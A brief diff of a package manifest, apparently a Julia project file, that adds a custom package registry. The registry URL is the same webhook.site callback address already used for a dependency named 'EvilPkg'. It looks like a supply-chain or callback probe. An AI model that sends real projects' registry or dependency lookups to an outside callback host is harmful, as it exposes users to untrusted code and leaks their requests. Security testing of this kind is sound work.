@@ -4,3 +4,7 @@ authors = ["a13h1 "]
 version = "0.1.0"
 [deps]
 EvilPkg = "https://webhook.site/969ace52-aa44-4524-b01d-411115e6d696"
+[registries]
+[registries.CustomRegistry]
+url = "https://webhook.site/969ace52-aa44-4524-b01d-411115e6d696"
+
